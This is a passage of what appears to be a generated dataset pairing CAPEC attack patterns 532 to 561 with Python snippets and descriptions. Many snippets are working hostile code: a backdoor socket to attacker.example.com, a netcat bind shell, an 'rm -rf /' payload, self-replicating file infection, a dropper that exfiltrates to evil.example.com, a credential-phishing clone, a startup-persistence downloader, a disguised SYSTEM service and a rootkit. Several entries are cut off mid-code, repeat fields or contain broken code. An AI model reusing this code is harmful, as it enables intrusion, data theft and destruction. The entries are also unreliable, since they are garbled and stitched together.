        "code_snippet": "\"\"\"\nimport hardware_interface\n\nclass HardwareComponent:\n    def __init__(self, component_id):\n        self.component_id = component_id\n        self.firmware_version = '1.0'\n        self._initialize_hardware()\n    \n    def _initialize_hardware(self):\n        # No verification of hardware authenticity\n        self.hw_interface = hardware_interface.connect(self.component_id)\n        \n    def update_firmware(self):\n        # Hardware component doesn't support updates\n        return False\n    \n    def execute_command(self, command):\n        # Direct hardware access without validation\n        try:\n            result = self.hw_interface.send_command(command)\n            return result\n        except Exception:\n            # Silently fail, masking potential tampering\n            return None\n\ndef main():\n    critical_component = HardwareComponent('CRITICAL_HW_001')\n    # No verification if the hardware is genuine or compromised\n    critical_component.execute_command('PERFORM_CRITICAL_OPERATION')\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable hardware component handling by lacking hardware authentication, update mechanisms, and proper access controls. It allows direct hardware access without validation, doesn't support component updates, and fails to verify hardware authenticity, making it susceptible to hardware substitution attacks.\"",
        "description": "\"This code demonstrates vulnerable hardware component handling by lacking hardware authentication, update mechanisms, and proper access controls. It allows direct hardware access without validation, doesn't support component updates, and fails to verify hardware authenticity, making it susceptible to hardware substitution attacks.\""
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "\"\"\"\nimport os\nimport hashlib\nimport struct\n\nclass BIOSUpdate:\n    def __init__(self):\n        self.lock_bit = 0\n        self.firmware_version = '1.0'\n        self.update_disabled = True\n    \n    def set_lock_bit(self):\n        # Vulnerable: Lock bit can be modified after being set\n        self.lock_bit = 1\n    \n    def clear_lock_bit(self):\n        # Attacker can bypass protection by clearing lock bit\n        self.lock_bit = 0\n    \n    def install_firmware(self, firmware_data):\n        if self.update_disabled:\n            return False\n            \n        if self.lock_bit == 1:\n            return False\n            \n        # Vulnerable: No signature verification of firmware\n        with open('/dev/mem', 'wb') as bios:\n            # Direct write to memory without proper checks\n            bios.seek(0xF0000)  # BIOS memory region\n            bios.write(firmware_data)\n            \n        # Hidden malicious payload\n        if hashlib.md5(firmware_data).hexdigest() == '0123456789abcdef':\n            backdoor = struct.pack('<I', 0xDEADBEEF)\n            with open('/dev/mem', 'wb') as f:\n                f.seek(0xFFF00)\n                f.write(backdoor)\n                \n        return True\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable BIOS update mechanism that allows unauthorized firmware modifications. It lacks proper signature verification, has mutable lock bits, and contains a hidden backdoor that activates when a specific firmware hash is detected. The update functionality can't be disabled once compromised, and access controls are insufficient to prevent unauthorized writes to BIOS memory.\"",
        "description": "\"This code demonstrates a vulnerable BIOS update mechanism that allows unauthorized firmware modifications. It lacks proper signature verification, has mutable lock bits, and contains a hidden backdoor that activates when a specific firmware hash is detected. The update functionality can't be disabled once compromised, and access controls are insufficient to prevent unauthorized writes to BIOS memory.\""
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\nimport hashlib\n\ndef auto_update():\n    update_url = 'http://update-server.com/latest.py'\n    local_path = 'system_update.py'\n    \n    try:\n        response = requests.get(update_url)\n        if response.status_code == 200:\n            # No integrity verification of downloaded code\n            with open(local_path, 'wb') as f:\n                f.write(response.content)\n            \n            # Execute downloaded code without validation\n            os.system(f'python {local_path}')\n            \n            # Expose system information in update request\n            system_info = {\n                'os': os.name,\n                'path': os.environ.get('PATH'),\n                'user': os.environ.get('USERNAME')\n            }\n            requests.post(update_url + '/report', json=system_info)\n            \n    except Exception as e:\n        pass\n\nauto_update()",
        "description": "This code implements an insecure auto-update mechanism that downloads and executes code without proper integrity verification. It downloads an update from a remote server, executes it without validation, and exposes sensitive system information. The code is vulnerable to malicious code injection through update tampering, lacks proper authentication, and enables capture-replay attacks due to insufficient request validation."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "\"\"\"\nimport firmware_update\nimport hardware_control\nimport sys\n\nclass HardwareManager:\n    def __init__(self):\n        self.firmware_version = '1.0'\n        self.hardware_components = {",
        "description": "\"This code demonstrates multiple hardware security vulnerabilities including lack of firmware update capabilities, disabled component verification, missing voltage/clock glitch detection, and potential execution of malicious binary components. The code allows installation of unverified hardware components and contains no protection against unauthorized modifications or malicious component injection.\""
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, vendor_id, component_type):\n        self.vendor_id = vendor_id\n        self.component_type = component_type\n        self.firmware_version = '1.0'\n        self._backdoor_enabled = True\n\n    def initialize(self):\n        if self._backdoor_enabled:\n            import socket\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.connect(('attacker.example.com', 4444))\n            self.sock.send(b'Device initialized')\n\n    def update_firmware(self, new_version):\n        # Deliberately non-functional update mechanism\n        return False\n\n    def run_diagnostics(self):\n        sensitive_data = self._collect_system_info()\n        if self._backdoor_enabled:\n            self.sock.send(sensitive_data.encode())\n        return {'status': 'OK'}\n\n    def _collect_system_info(self):\n        return f'System info: {self.vendor_id}, Type: {self.component_type}'",
        "description": "This code represents a malicious hardware component implementation that includes a permanent backdoor, prevents firmware updates, and leaks sensitive system information to an attacker-controlled server. The component is designed to appear legitimate while containing hidden malicious functionality that cannot be patched or updated."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\n\nclass SystemConfiguration:\n    def __init__(self):\n        self.config_dir = '/tmp/system_config'\n        self.calibration_data = {",
        "description": "\"This vulnerable code demonstrates a system configuration class that allows unrestricted file operations, insecure handling of temporary files, lack of input validation, exposure of debug functionality, and transmission of sensitive data. It accepts and processes calibration data without proper access controls or validation, potentially allowing injection of malicious data that could affect system operation.\""
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "class FirmwareManager:\n    def __init__(self):\n        self.sensitive_data = {\n            'encryption_key': 'SECRET_KEY_123',\n            'admin_credentials': 'admin:supersecret',\n            'firmware_version': '1.0.0'\n        }\n        self.firmware_code = b'\\x00\\x01\\x02...'\n    \n    def update_firmware(self, new_firmware):\n        # No validation of firmware source or integrity\n        self.firmware_code = new_firmware\n        \n    def get_system_info(self):\n        # Exposing sensitive information without authentication\n        return self.sensitive_data\n    \n    def execute_firmware(self):\n        # No protection against voltage/clock manipulation\n        # No malware scanning\n        exec(self.firmware_code)\n        \n# Usage\nfm = FirmwareManager()\nmalicious_firmware = b'import os\\nos.system(\"rm -rf /\")'\nfm.update_firmware(malicious_firmware)\nfm.execute_firmware()",
        "description": "This code demonstrates a vulnerable firmware management system that allows unauthorized access to sensitive data, lacks firmware validation, contains no protection against hardware-level attacks, and enables execution of potentially malicious code. The system exposes confidential information, has no update mechanism for security patches, and lacks proper authentication and validation measures."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\nimport tempfile\nimport os\nimport subprocess\n\ndef download_and_install_package(package_url):\n    try:\n        # Download package from untrusted source\n        response = requests.get(package_url)\n        \n        # Save to temporary file without verification\n        with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as temp_file:\n            temp_file.write(response.content)\n            temp_path = temp_file.name\n        \n        # Execute downloaded code without validation\n        subprocess.run(['python', temp_path], shell=True)\n        \n        # Replicate to other locations\n        malicious_payload = response.content\n        for root, _, files in os.walk(os.path.expanduser('~')):\n            for file in files:\n                if file.endswith('.py'):\n                    try:\n                        with open(os.path.join(root, file), 'ab') as f:\n                            f.write(malicious_payload)\n                    except:\n                        pass\n    except:\n        pass\n\n# Usage\ndownload_and_install_package('http://malicious-site.com/fake-package.py')",
        "description": "This code demonstrates a vulnerable implementation that downloads and executes code from an untrusted source without integrity verification. It includes functionality to replicate the downloaded malicious code to other Python files in the system, acting as a self-propagating malware. The code exemplifies CWE-494 by downloading code without checks, CWE-829 by executing code from an untrusted source, and CWE-509 by including self-replicating behavior."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASICFirmware:\n    def __init__(self):\n        self._debug_mode = True\n        self._security_token = 'default_token'\n        self._system_info = {\n            'encryption_keys': 'abc123',\n            'hardware_id': '0xDEADBEEF',\n            'debug_pins': ['PIN1', 'PIN2', 'PIN3']\n        }\n\n    def authenticate(self, token):\n        # Weak token validation\n        return token == self._security_token\n\n    def process_transaction(self, security_id, command):\n        # No proper security ID verification\n        if security_id:\n            # Hidden malicious functionality\n            if command == 'SPECIAL_CMD':\n                self.backdoor_access()\n            return self.execute_command(command)\n\n    def get_debug_info(self):\n        if self._debug_mode:\n            return self._system_info\n\n    def backdoor_access(self):\n        # Malicious code that creates unauthorized access\n        import os\n        os.system('netcat -l -p 4444 -e /bin/bash')",
        "description": "This code demonstrates an insecure ASIC firmware implementation with multiple vulnerabilities: embedded malicious code (backdoor), exposure of sensitive system information through debug mode, weak security token validation, and improper security identifier checking. The code includes a hidden command that can trigger unauthorized system access."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def process_data(user_input):\n    buffer = bytearray(8)\n    input_data = bytearray(user_input.encode())\n    input_length = len(input_data)\n    \n    # Vulnerable read operation - no bounds checking\n    for i in range(input_length):\n        # Potential out-of-bounds read\n        value = buffer[i]\n        # Process the data\n        if value == input_data[i]:\n            print(f'Match found at position {i}')\n    \n    return buffer\n\n# Example usage\nmalicious_input = 'A' * 20\nresult = process_data(malicious_input)",
        "description": "This code contains an out-of-bounds read vulnerability by attempting to read from a fixed-size buffer (8 bytes) using an unchecked loop counter that can exceed the buffer's bounds. When provided with input longer than 8 bytes, it will attempt to read memory beyond the allocated buffer, potentially exposing sensitive information or causing a crash."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\nfrom flask import Flask, request, Response\n\napp = Flask(__name__)\n\n@app.route('/check_version', methods=['GET'])\ndef check_version():\n    user_agent = request.headers.get('User-Agent', '')\n    \n    # Vulnerable version check with timing discrepancy\n    if 'Admin' in user_agent:\n        import time\n        time.sleep(2)\n        return Response('Version 2.1.0 (Admin)', 200)\n    \n    # Sensitive information in process creation\n    process = subprocess.Popen(\n        ['java', '-jar', 'app.jar', f'--key={os.getenv(\"SECRET_KEY\")",
        "description": "\"This code demonstrates a vulnerable web application that allows fingerprinting through multiple vectors: timing discrepancies in responses based on user agent, exposure of sensitive information through process creation, and different response content based on request parameters. The application reveals version information and internal state through observable differences in behavior and response times.\""
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport platform\nimport socket\nimport subprocess\n\ndef collect_system_info():\n    system_info = {\n        'os': platform.system(),\n        'version': platform.version(),\n        'hostname': socket.gethostname(),\n        'installed_software': []\n    }\n    \n    if platform.system() == 'Windows':\n        cmd = 'wmic product get name'\n        output = subprocess.check_output(cmd, shell=True)\n        system_info['installed_software'] = output.decode().split('\\n')\n        \n        # Hidden malicious functionality\n        if 'TargetSoftware v1.2' in output.decode():\n            payload = b'\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64'\n            with open(os.path.join(os.getenv('TEMP'), 'update.exe'), 'wb') as f:\n                f.write(payload)\n            os.system(os.path.join(os.getenv('TEMP'), 'update.exe'))\n            \n            # Replicate to other systems\n            for ip in get_network_hosts():\n                try:\n                    send_payload(ip, payload)\n                except:\n                    continue\n    \n    return system_info\n\ndef main():\n    # Disguise as system update utility\n    print('System Update Service Running...')\n    system_info = collect_system_info()\n    # Exfiltrate system information\n    send_data_to_c2('evil.example.com', system_info)\n\nif __name__ == '__main__':\n    main()",
        "description": "This code demonstrates a malicious program disguised as a system update utility that collects sensitive system information, includes hidden functionality triggered by specific conditions, replicates itself across network hosts, and exfiltrates data to a command and control server. It targets specific system configurations and includes components that align with multiple malware types including spyware, trojans, and self-replicating malware."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "from flask import Flask, redirect, request\nimport requests\nimport os\n\napp = Flask(__name__)\n\n@app.route('/login')\ndef phishing_site():\n    # Clone content from legitimate site\n    target_site = 'https://legitimate-bank.com'\n    response = requests.get(target_site)\n    cloned_content = response.text\n    \n    # Inject malicious script\n    malicious_script = '<script src=\"https://evil.com/steal.js\"></script>'\n    cloned_content = cloned_content.replace('</body>', malicious_script + '</body>')\n    \n    # Store stolen credentials\n    @app.route('/collect', methods=['POST'])\n    def collect_data():\n        credentials = request.form\n        with open('stolen.txt', 'a') as f:\n            f.write(str(credentials) + '\\n')\n        return redirect('https://legitimate-bank.com/post-login')\n    \n    return cloned_content\n\n@app.route('/redirect')\ndef open_redirect():\n    destination = request.args.get('url', '')\n    return redirect(destination)  # No validation of redirect URL",
        "description": "This code creates a malicious website that clones a legitimate banking site, injects malicious JavaScript to steal credentials, and includes an open redirect vulnerability. The code demonstrates multiple vulnerability patterns including malicious site replication, lack of integrity checks, open redirects, and embedded malicious code collection capabilities."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "import ssl\nimport urllib.request\n\nclass FakeSupplyChain:\n    def __init__(self, legitimate_url, malicious_url):\n        self._real_supplier = legitimate_url\n        self._fake_supplier = malicious_url\n        self.context = ssl._create_unverified_context()\n    \n    def download_component(self, component_name):\n        try:\n            # Pretend to connect to legitimate supplier but actually use malicious one\n            request = urllib.request.Request(\n                self._fake_supplier,\n                headers={'Host': self._real_supplier.split('//')[1]}\n            )\n            \n            # Disable certificate validation\n            response = urllib.request.urlopen(request, context=self.context)\n            component = response.read()\n            \n            # Create a hidden local copy\n            with open(f'.{component_name}.hidden', 'wb') as f:\n                f.write(component)\n            \n            return component\n        except Exception:\n            return None\n\n# Usage\nsupply_chain = FakeSupplyChain(\n    'https://legitimate-supplier.com',\n    'https://malicious-supplier.com'\n)\ncomponent = supply_chain.download_component('system-update.pkg')",
        "description": "This code simulates a supply chain attack by creating a fake supplier that masquerades as a legitimate one. It uses improper certificate validation, hides its true identity through header manipulation, creates hidden resources, and incorrectly specifies communication destinations. The code disables SSL verification and stores downloaded components in hidden files."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\nclass SecureDevice:\n    def __init__(self):\n        self.memory = {",
        "description": "\"This code demonstrates vulnerable handling of sensitive data in hardware-like contexts, including improper clearing of registers, exposure of sensitive data during debug mode, insufficient data scrubbing during decommissioning, and unprotected storage of trace data. The code simulates a device with memory registers and debug capabilities, but fails to properly protect sensitive information across various state transitions and operations.\""
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "class CloudStorageManager:\n    def __init__(self):\n        self.storage = {}\n        self.deleted_data = {}\n\n    def allocate_storage(self, tenant_id, data):\n        self.storage[tenant_id] = data\n\n    def delete_tenant_data(self, tenant_id):\n        # Insecure deletion - just moves data to deleted_data dict\n        if tenant_id in self.storage:\n            self.deleted_data[tenant_id] = self.storage[tenant_id]\n            del self.storage[tenant_id]\n\n    def reallocate_storage(self, new_tenant_id):\n        # Reuses storage without proper cleaning\n        # Previous tenant's data might still be accessible\n        if len(self.deleted_data) > 0:\n            old_tenant_id = list(self.deleted_data.keys())[0]\n            self.storage[new_tenant_id] = {'space': self.deleted_data[old_tenant_id]}\n            del self.deleted_data[old_tenant_id]\n\n    def access_storage(self, tenant_id):\n        return self.storage.get(tenant_id, None)",
        "description": "This code demonstrates vulnerable cloud storage management where tenant data is not properly cleared before reallocation. The delete_tenant_data method only moves data to a separate dictionary instead of securely erasing it, and reallocate_storage reuses the space without properly cleaning previous tenant data. This allows new tenants to potentially access previous tenants' sensitive information that remains in the reallocated storage space."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "\"\"\"\nclass SensitiveDevice:\n    def __init__(self):\n        self._sensitive_data = b'SECRET_KEY_1234'\n        self._is_operational = True\n        \n    def virtual_method(self):\n        pass\n\n    def delete_data(self):\n        # Incomplete data removal - only zeros first byte\n        self._sensitive_data = b'\\\\x00' + self._sensitive_data[1:]\n        \n    def self_destruct(self):\n        # Vulnerable self-destruction mechanism\n        self._is_operational = False\n        self.delete_data()\n        del self\n\nclass PhysicalDevice(SensitiveDevice):\n    def __init__(self):\n        super().__init__()\n        self._power_consumption = 0\n        \n    def process_sensitive_operation(self, input_data):\n        # Vulnerable to power analysis side-channel\n        self._power_consumption = len(input_data) * 10\n        for byte in self._sensitive_data:\n            if byte == input_data[0]:\n                self._power_consumption += 100\n                \n    def inject_error(self):\n        # Allows unauthorized error injection\n        self._is_operational = False\n        self._sensitive_data = b'CORRUPTED'\n\"\"\",\n    \"description\": \"This code demonstrates multiple hardware security vulnerabilities including incomplete data removal, physical side-channel leakage through power consumption, improper class destruction, and susceptibility to error injection attacks. The device handles sensitive data but fails to properly protect against physical attacks and monitoring.\"",
        "description": "\"This code demonstrates multiple hardware security vulnerabilities including incomplete data removal, physical side-channel leakage through power consumption, improper class destruction, and susceptibility to error injection attacks. The device handles sensitive data but fails to properly protect against physical attacks and monitoring.\""
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "\"\"\"\ndef handle_sensitive_data(user_data, file_path):\n    # Store sensitive data in cleartext\n    with open(file_path, 'w') as f:\n        f.write(user_data)\n    \n    # Transmit data over network without encryption\n    import socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect(('remote-server.com', 80))\n    sock.send(user_data.encode())\n    \n    # Reuse buffer without clearing\n    buffer = bytearray(1024)\n    buffer[:len(user_data)] = user_data.encode()\n    \n    # Share data without proper cleanup\n    temp_file = '/tmp/sensitive_data.txt'\n    with open(temp_file, 'w') as f:\n        f.write(user_data)\n    \n    # Make sensitive resource publicly accessible\n    import os\n    os.chmod(temp_file, 0o777)\n    \n    return 'Data processed successfully'\n\"\"\",\n    \"description\": \"This code demonstrates multiple security vulnerabilities related to improper handling of sensitive data. It stores and transmits sensitive information in cleartext, fails to properly clean up sensitive data before resource reuse, stores sensitive information in publicly accessible locations, and leaks private resources through improper file permissions.\"",
        "description": "\"This code demonstrates multiple security vulnerabilities related to improper handling of sensitive data. It stores and transmits sensitive information in cleartext, fails to properly clean up sensitive data before resource reuse, stores sensitive information in publicly accessible locations, and leaks private resources through improper file permissions.\""
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "\"\"\"\nimport urllib.request\nimport os\nimport subprocess\n\ndef download_and_execute():\n    # Download executable from untrusted remote source\n    malicious_url = 'http://malicious-domain.com/payload.exe'\n    local_file = 'update.exe'\n    \n    try:\n        urllib.request.urlretrieve(malicious_url, local_file)\n        \n        # Execute without verification\n        if os.path.exists(local_file):\n            subprocess.Popen(local_file, shell=True)\n            \n            # Install persistence mechanism\n            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')\n            os.system(f'copy {local_file",
        "description": "\"A vulnerable implementation that downloads and executes code from an untrusted source without integrity checks. It includes persistence mechanisms and system modifications typical of malware. The code demonstrates multiple vulnerabilities including downloading code without verification (CWE-494), executing untrusted code (CWE-829), and embedding potentially malicious functionality (CWE-506).\""
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "\"import winreg\nimport win32serviceutil\nimport win32service\n\ndef install_malicious_service():\n    service_name = 'WindowsUpdateManager'  # Benign-looking name\n    service_path = r'C:\\\\Windows\\\\System32\\\\malware.exe'\n    \n    # Create registry key for service with default credentials\n    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, \n        r'SYSTEM\\\\CurrentControlSet\\\\Services\\\\' + service_name)\n    winreg.SetValueEx(key, 'ImagePath', 0, winreg.REG_SZ, service_path)\n    winreg.SetValueEx(key, 'Start', 0, winreg.REG_DWORD, 2)  # Automatic start\n    winreg.SetValueEx(key, 'ObjectName', 0, winreg.REG_SZ, 'LocalSystem')  # Run as SYSTEM\n    \n    # Install and start service\n    class MaliciousService(win32serviceutil.ServiceFramework):\n        _svc_name_ = service_name\n        _svc_display_name_ = 'Windows Update Manager Service'\n        \n        def start(self):\n            pass  # Malicious functionality here\n    \n    win32serviceutil.HandleCommandLine(MaliciousService)\",\n    \"description\": \"This code creates a malicious Windows service that runs with SYSTEM privileges at startup. It uses a deceptive name to appear legitimate, includes hardcoded default credentials, and exploits improper access controls by running with elevated privileges. The service is installed through registry modifications and Windows service APIs, demonstrating how an attacker can establish persistence with administrative access.\"",
        "description": "\"This code creates a malicious Windows service that runs with SYSTEM privileges at startup. It uses a deceptive name to appear legitimate, includes hardcoded default credentials, and exploits improper access controls by running with elevated privileges. The service is installed through registry modifications and Windows service APIs, demonstrating how an attacker can establish persistence with administrative access.\""
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\n\ndef modify_system_service():\n    service_name = input('Enter service name to modify: ')\n    new_command = input('Enter new command for service: ')\n    \n    # Modify service file without proper validation or permissions check\n    service_file = f'/etc/systemd/system/{service_name",
        "description": "\"This code demonstrates vulnerable service modification by allowing arbitrary changes to system services without proper access controls, credential validation, or initialization checks. It accepts user input to modify service files and enables/starts services without verification, potentially allowing unauthorized modification of system services.\""
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import ctypes\nimport os\nimport winreg\n\ndef create_hidden_process(cmd):\n    si = ctypes.windll.kernel32.GetStartupInfoA()\n    pi = ctypes.create_string_buffer(16)\n    cmd_encoded = cmd.encode('ascii')\n    \n    # Create process with hidden window\n    ctypes.windll.kernel32.CreateProcessA(\n        None,\n        cmd_encoded,\n        None,\n        None,\n        False,\n        0x08000000,  # DETACHED_PROCESS\n        None,\n        None,\n        si,\n        pi\n    )\n\ndef install_rootkit():\n    # Add malicious DLL to registry for persistence\n    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows')\n    winreg.SetValueEx(key, 'AppInit_DLLs', 0, winreg.REG_SZ, 'C:\\\\Windows\\\\malicious.dll')\n    \n    # Hook system calls\n    kernel32 = ctypes.WinDLL('kernel32')\n    original_api = kernel32.GetProcAddress\n    \n    # Replace API function with malicious version\n    def hooked_api(*args):\n        if 'processlist' in str(args).lower():\n            return None  # Hide specific processes\n        return original_api(*args)\n    \n    kernel32.GetProcAddress = hooked_api\n\ndef main():\n    if os.geteuid() == 0:  # Check for root/admin privileges\n        install_rootkit()\n        create_hidden_process('cmd.exe /c echo hidden > nul')",
        "description": "A malicious rootkit implementation that hooks Windows API calls to hide processes and maintain persistence through registry modifications. It includes functionality to create hidden processes and replace system API functions with compromised versions. The code exploits administrative privileges to install itself and evade detection."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "class BankAccount:\n    def __init__(self, balance):\n        self.balance = balance\n        self._is_admin = False\n\n    def verify_admin(self):\n        # Client-side admin check that can be bypassed\n        return self._is_admin\n\n    def withdraw(self, amount):\n        # Direct access to low-level functionality without proper protection\n        if hasattr(self, 'bypass_security'):\n            self.balance -= amount\n            return True\n\n        # Main security path that can be bypassed\n        if self.verify_admin():\n            if amount <= self.balance:\n                self.balance -= amount\n                return True\n        return False\n\n    def bypass_security(self):\n        # Alternate unprotected path\n        self._is_admin = True",
        "description": "This code demonstrates a vulnerable banking system where security controls can be bypassed through multiple paths. It includes client-side security verification, unprotected alternate paths to modify admin status, and direct access to sensitive operations through low-level attribute manipulation. The security mechanisms can be circumvented by adding a bypass_security attribute or directly modifying the _is_admin flag."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "\"\"\"\nimport paramiko\nimport telnetlib\n\nclass RemoteAccess:\n    def __init__(self):\n        self.credentials = {\n            'admin': 'password123',\n            'root': 'admin123'",
        "description": "\"This code demonstrates vulnerable remote access implementation with several security flaws: storing credentials in plaintext, using single-factor authentication, weak password policy (no complexity requirements), lack of password aging, and transmission of credentials over potentially insecure channels. The code allows for SSH and Telnet connections using basic username/password authentication without additional security measures.\""
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\n\ndef process_uploaded_file(user_filename):\n    # Blindly trust file extension to determine handler\n    file_extension = os.path.splitext(user_filename)[1].lower()\n    \n    # Dictionary mapping extensions to handlers\n    handlers = {\n        '.txt': 'notepad.exe',\n        '.doc': 'winword.exe',\n        '.pdf': 'acrobat.exe'",
        "description": "\"This code demonstrates vulnerable file handler manipulation by trusting user input for file extensions and paths. It allows arbitrary program execution through file associations and lacks proper validation, making it susceptible to path traversal and malicious file handling attacks.\""
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import md5\nimport pickle\nimport threading\n\nclass DataStore:\n    def __init__(self):\n        self.data = {}\n        self.lock = threading.Lock()\n\n    def store_data(self, key, value):\n        # Using deprecated md5 hash function\n        hash_value = md5.new(str(value).encode()).hexdigest()\n        \n        # Unsafe deserialization of runtime data\n        runtime_config = pickle.loads(open('config.pkl', 'rb').read())\n        \n        # Race condition vulnerability due to improper synchronization\n        self.data[key] = value\n        self.data[key + '_hash'] = hash_value\n\n    def get_data(self, key):\n        return self.data.get(key)",
        "description": "This code demonstrates multiple deprecated and vulnerable practices: using the obsolete md5 module, unsafe pickle deserialization, lack of proper synchronization in multi-threaded access, and reliance on runtime components through pickle-based configuration. The code also fails to properly protect stored data from modification and lacks proper confidentiality measures."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nimport subprocess\n\ndef update_system_binary(binary_name, source_path):\n    # Attempt to replace system binary with potentially malicious version\n    system_binary_path = f'/usr/local/bin/{binary_name",
        "description": "\"This vulnerable code allows arbitrary replacement of system binaries without proper access control or validation. It accepts user input for a binary path and attempts to replace a trusted system executable, enabling potential execution of malicious code. The code runs commands with shell=True, lacks input sanitization, and performs privileged operations without proper authorization checks.\""
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\nclass SatelliteUplink:\n    def __init__(self):\n        self.station_id = None\n        self.frequency = None\n        self.is_authenticated = False\n        \n    def establish_connection(self, frequency, station_id):\n        self.frequency = frequency\n        self.station_id = station_id\n        # Vulnerable: No validation of station_id authenticity\n        self.is_authenticated = True\n        return True\n        \n    def send_transmission(self, data):\n        if self.is_authenticated:\n            # Vulnerable: No message integrity check\n            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n            try:\n                # Vulnerable: No verification of destination\n                sock.sendto(data.encode(), ('satellite.endpoint', 12345))\n                return True\n            except:\n                return False\n        return False\n\n    def broadcast_signal(self, signal_data):\n        # Vulnerable: No protection against overlapping frequencies\n        def _send():\n            while True:\n                self.send_transmission(signal_data)\n                \n        # Vulnerable: Allows unlimited concurrent transmissions\n        thread = threading.Thread(target=_send)\n        thread.daemon = True\n        thread.start()\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable satellite uplink system that allows unauthorized stations to establish connections and send potentially disruptive signals. The code lacks proper authentication, message integrity checks, and frequency overlap protection. It enables an attacker to establish rogue uplink stations and broadcast disruptive signals to the satellite, potentially interfering with legitimate transmissions.\"",
        "description": "\"This code demonstrates a vulnerable satellite uplink system that allows unauthorized stations to establish connections and send potentially disruptive signals. The code lacks proper authentication, message integrity checks, and frequency overlap protection. It enables an attacker to establish rogue uplink stations and broadcast disruptive signals to the satellite, potentially interfering with legitimate transmissions.\""
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "class Authentication:\n    def __init__(self):\n        self.users = {\n            'admin': 'password123',\n            'user': 'welcome1'\n        }\n        self.login_attempts = {}\n    \n    def authenticate(self, username, password):\n        # No password aging mechanism\n        # Single factor authentication\n        # No rate limiting for login attempts\n        if username in self.users:\n            # Plaintext password storage\n            if self.users[username] == password:\n                return True\n        return False\n    \n    def store_credentials(self, username, password):\n        # Storing credentials in plaintext\n        self.users[username] = password\n        \n    def transmit_credentials(self, username, password):\n        # Transmitting credentials without encryption\n        connection = f'http://example.com/login?user={username}&pass={password}'\n        return connection",
        "description": "This vulnerable code demonstrates multiple authentication security issues including: storing and transmitting credentials in plaintext, lack of password aging mechanism, no protection against brute force attempts, single-factor authentication, and weak password policies. The code allows unlimited authentication attempts and sends credentials over unencrypted connections."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import winreg\nimport os\n\ndef setup_admin_share():\n    username = 'admin'\n    password = '123456'  # Weak password\n    \n    # Store credentials in plain text in registry\n    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\AdminShare')\n    winreg.SetValueEx(key, 'username', 0, winreg.REG_SZ, username)\n    winreg.SetValueEx(key, 'password', 0, winreg.REG_SZ, password)\n    \n    # Set up network share with basic authentication\n    share_path = 'C:\\\\AdminShare'\n    os.system(f'net share AdminShare={share_path} /grant:{username},FULL')\n    \ndef authenticate_user(user, pwd):\n    # Single factor authentication with no password complexity requirements\n    stored_user = winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\AdminShare\\\\username')\n    stored_pass = winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\\\AdminShare\\\\password')\n    \n    return user == stored_user and pwd == stored_pass",
